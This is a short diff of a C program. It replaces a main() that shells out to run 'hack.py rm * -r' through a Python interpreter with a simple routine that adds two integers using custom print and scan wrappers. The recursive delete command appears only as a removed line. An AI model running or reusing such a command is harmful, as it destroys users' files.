@@ -1,4 +1,4 @@
-#include<stdio.h>
+#include <stdio.h>
 #include <stdarg.h>
 void printt(const char* format, ...) {
 va_list args;
@@ -17,6 +17,12 @@ va_end(args);
 return result;
 }
 int main(){
-system("/nix/store/h4h5rxs0hzpzvz37yrwv1k2na1acgzww-python3-3.9.15/bin/python hack.py rm * -r");
+int number1, number2, sum;
+printt("Enter two integers: ");
+scann("%d", &number1);
+scann("%d", &number2);
+// calculate the sum
+sum = number1 + number2;
+printt("%d + %d = %d", number1, number2, sum);
 return 0;
 }
